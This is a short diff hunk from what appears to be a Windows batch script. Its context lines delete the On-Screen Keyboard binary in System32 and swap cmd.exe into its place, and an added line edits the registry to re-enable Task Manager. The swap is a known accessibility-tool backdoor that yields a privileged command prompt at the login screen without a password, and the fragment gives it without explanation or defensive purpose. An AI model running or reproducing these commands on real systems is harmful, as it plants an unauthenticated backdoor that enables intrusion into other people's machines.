@@ -6,3 +6,4 @@ del C:\Windows\System32\osk.exe
 ren C:\Windows\System32\cmd.exe osk1.exe
 copy C:\Windows\System32\osk1.exe C:\Windows\System32\cmd.exe
 ren C:\Windows\System32\osk1.exe osk.exe
+REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
